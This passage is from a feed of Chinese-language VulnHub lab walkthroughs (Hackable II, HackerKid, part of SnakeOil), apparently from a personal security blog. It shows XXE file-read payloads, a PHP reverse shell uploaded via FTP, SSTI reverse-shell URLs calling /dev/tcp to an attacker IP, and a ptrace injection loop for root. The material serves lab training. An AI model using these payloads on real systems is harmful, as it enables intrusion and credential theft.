            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWksNzExLw==\">https://www.vulnhub.com/entry/hackable-ii,711/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY4NzYyMS9hcnRpY2xlL2RldGFpbHMvMTE5Mzg2Njgz\">https://blog.csdn.net/weixin_44687621/article/details/119386683</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 HACKABLELL：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-564.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.6</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.6</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-565.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21,22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==\">http://192.168.31.102/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-566.png\" width=\"650\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.6</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-567.png\" width=\"440\" alt=\"Image\">\n<p>只看到了一个目录，是 files 文件夹，直接访问此链接: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy8=\">http://192.168.31.6/files/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-568.png\" width=\"330\" alt=\"Image\">\n<p>查看此文件指向地址的详细内容:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy9DQUxMLmh0bWw=\">http://192.168.31.6/files/CALL.html</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-569.png\" width=\"300\" alt=\"Image\">\n<p>审查源代码，查看更多的关键信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-571.png\" width=\"520\" alt=\"Image\">\n<p>网站信息收集之后没有什么关键的信息</p>\n<h3 id=\"ftp-匿名下载上传\"><a class=\"markdownIt-Anchor\" href=\"#ftp-匿名下载上传\">#</a> FTP 匿名下载上传</h3>\n<p>对 ftp 做检查，检测 ftp 服务上是否存在弱口令，是否能搜集到关键信息</p>\n<p>ftp 192.168.31.6<br>\nget CALL.html</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-572.png\" width=\"420\" alt=\"Image\">\n<p>将 CALL.html 文件下载之后查阅，发现和 web 服务是同样的代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-573.png\" width=\"420\" alt=\"Image\">\n<p>可以控制 ftp 服务向靶机发送 payload，判断是否能上传到网站<br>\n <code>cp /usr/share/webshells/php/php-reverse-shell.php .</code></p>\n<p>修改监听 ip 地址和端口号为攻击机<br>\n <code>cat shell.php | head -n 55 | tail -n 10</code></p>\n<p>连接 ftp，put shell.php 上传文件，打开网址发现 exp 上传成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-574.png\" width=\"370\" alt=\"Image\">\n<p>点击运行即可成功收到会话，也可以上传一句话木马，使用蚁剑连接</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-575.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"md5-解密\"><a class=\"markdownIt-Anchor\" href=\"#md5-解密\">#</a> MD5 解密</h3>\n<p>查看目录下 important.txt 文件，发现根目录有可执行脚本，运行一下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-577.png\" width=\"320\" alt=\"Image\">\n<p>解密这个 md5，得到 onion。猜测这是 ssh 的登录密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-578.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"sudopython3提权\"><a class=\"markdownIt-Anchor\" href=\"#sudopython3提权\">#</a> sudo (python3) 提权</h3>\n<p>su shrek 依靠 onion 密码登陆 ssh 成功<br>\n这里使用 python 进行提权，得到 root 身份运行的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-579.png\" width=\"520\" alt=\"Image\">\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/126%20HACKERKID/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/126%20HACKERKID/",
            "title": "VULNHUB 26 HACKERKID",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2VyLWtpZC0xMDEsNzE5Lw==\">https://www.vulnhub.com/entry/hacker-kid-101,719/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDEwNzgzNi9hcnRpY2xlL2RldGFpbHMvMTE5NDIyODEw\">https://blog.csdn.net/weixin_44107836/article/details/119422810</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 HACKERKID：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）设置免密使用 sudo</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看 sudoers</span></span><br><span class=\"line\">sudo cat /etc/sudoers | tail -n 12 | head -n 8</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加免密登录</span></span><br><span class=\"line\">parallels ALL=(ALL) NOPASSWD:ALL</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">tail</span> -n表示筛选后面几行，<span class=\"built_in\">head</span> -n表示筛选前面几行</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-620.png\" width=\"380\" alt=\"Image\">\n<p>2 ）确定靶机 ip 地址<br>\n <code>sudo arp-sacn -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-621.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.11</p>\n<p>3 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p 192.168.31.11</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-622.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 53,80,9999</p>\n<h3 id=\"burp-重发数据包\"><a class=\"markdownIt-Anchor\" href=\"#burp-重发数据包\">#</a> Burp 重发数据包</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE=\">http://192.168.31.11</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-623.png\" width=\"650\" alt=\"Image\">\n<p>右键检查网页的源代码，发现提示，存在 page_no 的 GET 参数，即存在 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE/cGFnZV9ubz14eA==\">http://192.168.31.11?page_no=xx</span> 的一个页面，可以通过 py 来编写 1-100 的自然数，并且用 burp 进行批量访问</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-624.png\" width=\"520\" alt=\"Image\">\n<p>编写 python 脚本，用于生成 1-100 个数字，每行有 1 个数字</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-625.png\" width=\"440\" alt=\"Image\">\n<p>通过 tail 和 head 命令来检查所生成的文件是否正确</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-626.png\" width=\"440\" alt=\"Image\">\n<p>用浏览器拦截数据发送至 burp</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-627.png\" width=\"580\" alt=\"Image\">\n<p>将数据发送到 indruder 模式，在 page_no=<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 的位置设置字典，字典为前面 py 生成或者可以用 burp 自带的生成 1-100 的间隔为 1 的爆破字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-628.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 将接收包进行长度的排序得到一个不一样的长度，对应的 url 地址是 http://192.168.31.11?page_no=21</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-629.png\" width=\"480\" alt=\"Image\">\n<h3 id=\"修改本地-hosts\"><a class=\"markdownIt-Anchor\" href=\"#修改本地-hosts\">#</a> 修改本地 hosts</h3>\n<p>得到提示，有一些子域名被创建出来了，并且其中之一是 hackers.blackhat.local</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-630.png\" width=\"620\" alt=\"Image\">\n<p>修改本地 hosts 文件，将此域名的 ip 解析指向为靶机地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-631.png\" width=\"420\" alt=\"Image\">\n<p>打开 http://hackers.blackhat.local 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-632.png\" width=\"620\" alt=\"Image\">\n<p>提示接下来的思路是搜集到更多的子域名信息，并且这些子域名解析后的地址指向为靶机的 ip 地址，通过 dig 来指定 DNS 服务器搜集 hackers.blackhat.local 信息</p>\n<h3 id=\"dig指定dns解析\"><a class=\"markdownIt-Anchor\" href=\"#dig指定dns解析\">#</a> dig 指定 DNS 解析</h3>\n<p>Linux 下解析域名除了使用 nslookup 之外，开可以使用 dig 命令来解析域名，dig 命令可以得到更多的域名信息。dig 命令主要用来从 DNS 域名服务器查询主机地址信息。dig 的全称是 (domain information groper) 域信息筛选器。它是一个用来灵活探测 DNS 的工具。</p>\n<p><code>dig hackers.blackhat.local @192.168.31.11</code></p>\n<p>从指定的 DNS 服务器上进行查询，(从默认的 DNS 服务器上获得的结果可能不准确)。指定 DNS 服务器的方式为使用 @ 符号，如果不指定 DNS 服务器，dig 会依次使用 /etc/resolv.conf 里的地址作为 DNS 服务器：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-633.png\" width=\"590\" alt=\"Image\">\n<p>得到了一个新的子域名，将 dig 的结果添加到本地 hosts 文件中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-634.png\" width=\"470\" alt=\"Image\">\n<p>访问 <span class=\"exturl\" data-url=\"aHR0cDovL2hhY2tlcmlkLmJsYWNraGF0LmxvY2Fs\">http://hackerid.blackhat.local</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-635.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"xxe-读取敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#xxe-读取敏感信息\">#</a> xxe 读取敏感信息</h3>\n<p>将所有的信息都填写上，进行数据包的抓取，判断数据是怎么进入后台的，是否存在相应的漏洞可以进行利用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-636.png\" width=\"440\" alt=\"Image\">\n<p>通过 burp 抓取数据，发现数据是以 xml 的形式传播的，可以测试 xxe 漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-637.png\" width=\"440\" alt=\"Image\">\n<p>通过 xxe 漏洞进行读取 /etc/passwd</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">payload</span></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">  &lt;!DOCTYPE foo [&lt;!ENTITY dd SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;</span><br><span class=\"line\">    &lt;root&gt;</span><br><span class=\"line\">      &lt;name&gt;&lt;/name&gt;</span><br><span class=\"line\">      &lt;tel&gt;&lt;/tel&gt;</span><br><span class=\"line\">      &lt;email&gt;</span><br><span class=\"line\">        &amp;dd;</span><br><span class=\"line\">      &lt;/email&gt;</span><br><span class=\"line\">      &lt;password&gt;&lt;/password&gt;</span><br><span class=\"line\">    &lt;/root&gt;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-638.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 读取成功，并且找到了相关用户，如 saket，接下来尝试读取各种敏感文件。利用 php 为协议：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">完整的payload是</span></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">  &lt;!DOCTYPE foo [&lt;!ENTITY dd SYSTEM &#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;&gt;]&gt;</span><br><span class=\"line\">  &lt;root&gt;</span><br><span class=\"line\">    &lt;name&gt;&lt;/name&gt;</span><br><span class=\"line\">    &lt;tel&gt;&lt;/tel&gt;</span><br><span class=\"line\">    &lt;email&gt;</span><br><span class=\"line\">      &amp;dd;</span><br><span class=\"line\">    &lt;/email&gt;</span><br><span class=\"line\">    &lt;password&gt;&lt;/password&gt;</span><br><span class=\"line\">    &lt;/root&gt;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-639.png\" width=\"650\" alt=\"Image\">\n<p>出现了一串 base64 加密的字符，利用 base -d 解密后发现是用户名和密码<br>\n <code>cat bashrc.txt| base64 -d</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-640.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; username=“admin” password=“Saket!#$%@!!”</p>\n<h3 id=\"用户名喷洒\"><a class=\"markdownIt-Anchor\" href=\"#用户名喷洒\">#</a> 用户名喷洒</h3>\n<p>这是一个 ssh 登陆或者网站的后台密码，前面端口扫描时有个 9999 端口没有收集信息，我们进到这个页面看看这个 9999 端口是什么</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-641.png\" width=\"440\" alt=\"Image\">\n<p>尝试用破解出来的账户密码登陆时发现登陆失败</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-642.png\" width=\"440\" alt=\"Image\">\n<p>通过前面收集到的信息的总结，知道 /home 目录下有 saket 的用户，并且密码中也有 saket 的存在，尝试将用户名换为 saket 进行登陆</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-643.png\" width=\"440\" alt=\"Image\">\n<p>—&gt; 成功拿到后台权限</p>\n<h3 id=\"ssti模板注入\"><a class=\"markdownIt-Anchor\" href=\"#ssti模板注入\">#</a> SSTI 模板注入</h3>\n<p>登陆后台成功，提示需要一个 name 的参数</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-644.png\" width=\"440\" alt=\"Image\">\n<p>将 /name=1 的参数输入，在页面上出现了回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-645.png\" width=\"440\" alt=\"Image\">\n<p>接下来目标转向如何利用这个漏洞，用 nmap 扫描这个端口处是否存在框架</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-646.png\" width=\"340\" alt=\"Image\">\n<p>扫描到的结果是 torando 框架</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-647.png\" width=\"500\" alt=\"Image\">\n<p>发现框架为 python 框架，既然是 py 的，就可以尝试一下 SSTI 模板注入<br>\n关于 SSTI 模板注入，在 hacktrick 上有很详细的说明:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL3NzdGktc2VydmVyLXNpZGUtdGVtcGxhdGUtaW5qZWN0aW9u\">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</span></p>\n<p>SSTI 模板注入:  <code>http://192.168.31.60:9999/?name=&#123;&#123; 2 * 2 &#125;&#125;</code> <br>\n 页面回显为计算结果 4 ，表示此处确实存在 SSTI 模板注入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-648.png\" width=\"310\" alt=\"Image\">\n<p>导入包 os，执行系统命令:<br>\n <code>http://192.168.31.60:9999/?name=&#123;%%20import%20os%20%&#125;&#123;&#123;os.system(%27id%)27)&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-649.png\" width=\"650\" alt=\"Image\">\n<p>虽然当前没有回显出 id 命令执行后的结果，但是却也没有报错</p>\n<h3 id=\"ssti-反弹绕过\"><a class=\"markdownIt-Anchor\" href=\"#ssti-反弹绕过\">#</a> SSTI 反弹绕过</h3>\n<p>尝试用此处的 SSTI 模板进行反弹 shell</p>\n<p><code>http://192.168.31.60:9999/?name=&#123;% import os %&#125;&#123;&#123;os.system('bash -c \"bash -i >& /dev/tcp/192.168.31.135/4446 >&1\"')&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-650.png\" width=\"650\" alt=\"Image\">\n<p>反弹 shell 时报错，接下来用编码的方式绕过这种检查</p>\n<p>采用 url 编码的方式，在线地址为 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qc29ucy5jbi91cmxlbmNvZGU=\">http://www.jsons.cn/urlencode</span></p>\n<p>将 payload 进行编码后，拼接到原 url 后面，访问页面</p>\n<p><code>http://192.168.31.11:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.135%2F4444%200%3E%261%22%27)%7D%7D</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-651.png\" width=\"650\" alt=\"Image\">\n<p>与此同时，监听对应的端口，等到 shell 的反弹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-652.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; 得到 shell</p>\n<h3 id=\"弹出标准-shell\"><a class=\"markdownIt-Anchor\" href=\"#弹出标准-shell\">#</a> 弹出标准 SHELL</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">美化得到的终端</span></span><br><span class=\"line\">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo; fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者使用</span></span><br><span class=\"line\">SHELL=/bin/bash script -q /dev/null</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SHELL是环境变量，它的值代表系统执行shell的文件位置。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">script 命令的原本作用是录制终端的会话过程，执行该命令后会运行一个新的shell，在此shell中执行命令的过程将会记录下来并保存在一个文件里面。这里执行 script 并不需要录制命令过程，我们需要的仅仅是它会运行一个新的shell。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-q 代表以静默方式运行一个新的shell，也就是说在后台运行一个新的shell。如果不加这个参数，则会弹出一个新的shell命令框。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/dev/null在这条命令中扮演的角色是保存script记录的文件，但是/dev/null一个特殊的设备文件，一切写入改文件的数据都会消失。我们不需要记录我们所执行的命令，所以将script所记录的内容指向该设备文件。</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-653.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"linpeas-提权信息扫描\"><a class=\"markdownIt-Anchor\" href=\"#linpeas-提权信息扫描\">#</a> linpeas 提权信息扫描</h3>\n<p>尝试用 linux 提权工具提权，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1rYWxpbGlucGVhcy0zcDhxbTIwYjN4Ynp3OGFmN2dsNGI4eDNnLnNo\">提前在 kali 上准备好 linpeas.sh</span> 并通过 py 开启简易 web</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-654.png\" width=\"520\" alt=\"Image\">\n<p>在靶机上下载 linpeas.sh 并加可执行权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-655.png\" width=\"520\" alt=\"Image\">\n<p>执行并开始扫描./linpeas.sh</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-656.png\" width=\"420\" alt=\"Image\">\n<p>发现了 python2.7 的权限设置错误</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-657.png\" width=\"360\" alt=\"Image\">\n<h3 id=\"cap_sys_ptrace-提权\"><a class=\"markdownIt-Anchor\" href=\"#cap_sys_ptrace-提权\">#</a> cap_sys_ptrace 提权</h3>\n<p>关于 cap_sys_ptrace 提权的教程：<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LWhhcmRlbmluZy9wcml2aWxlZ2UtZXNjYWxhdGlvbi9saW51eC1jYXBhYmlsaXRpZXM=\">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</span></p>\n<p>Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p>\n<p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。如果 Capabilities 设置不正确，就会让攻击者有机可乘，实现权限提升。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-658.png\" width=\"520\" alt=\"Image\">\n<p>保存 payload，并按 hacktrick 上的教程进行复现</p>\n<p>利用参考中的 exp.py 文件，传入参数为选择的进程 id, 执行成功后会在靶机的 5600 端口开一个绑定 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-659.png\" width=\"460\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不一样的能力，每种能力表明必定的特权操做。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">setcap</span>来设置权限，<span class=\"built_in\">getcap</span>来验证权限是否设置正确。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CAP_SYS_PTRACE允许使用ptrace( 2 )和最近引入的跨内存附加系统调用，如果授予此功能并且ptrace( 2 )系统调用本身没有被 seccomp 过滤器阻止，这将允许攻击者绕过其他 seccomp 限制。</span></span><br><span class=\"line\">getcap -r / 2&gt;/dev/null</span><br><span class=\"line\">/usr/bin/python2.7 = cap_sys_ptrace+ep</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过<span class=\"keyword\">for</span>循环，来依次注入每一个root进程号</span></span><br><span class=\"line\">for i in `ps -ef|grep root|grep -v &quot;grep&quot;|awk &#x27;&#123;print $2&#125;&#x27;`; do python2.7 exp.py $i; done</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-660.png\" width=\"700\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注入成功后即可获取到root权限的shell</span></span><br><span class=\"line\">netstat -an | grep 5600</span><br><span class=\"line\">nc 192.168.31. 11 5600</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-661.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; 成功拿到 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/125%20SNAKEOIL/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/125%20SNAKEOIL/",
            "title": "VULNHUB 25 SNAKEOIL",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGlnaXRhbHdvcmxkbG9jYWwtc25ha2VvaWwsNzM4Lw==\">https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2ODg5NjQuaHRtbA==\">https://www.cnblogs.com/sainet/p/15688964.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 SNAKEOIL：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-580.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.143</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.143</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-581.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80,8080</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAy\">http://192.168.31.102</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-582.png\" width=\"540\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.143</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-583.png\" width=\"250\" alt=\"Image\">\n<p>-&gt; 80 端口没有任何发现</p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAv\">http://192.168.31.143:8080/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-584.png\" width=\"620\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.143:8080/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-585.png\" width=\"320\" alt=\"Image\">\n<p>-&gt; 8080 端口存在以下目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=\">http://192.168.31.143:8080/login</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u\">http://192.168.31.143:8080/registration</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvc2VjcmV0\">http://192.168.31.143:8080/secret</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdGVzdA==\">http://192.168.31.143:8080/test</span><br>\n<span class=\"exturl\" 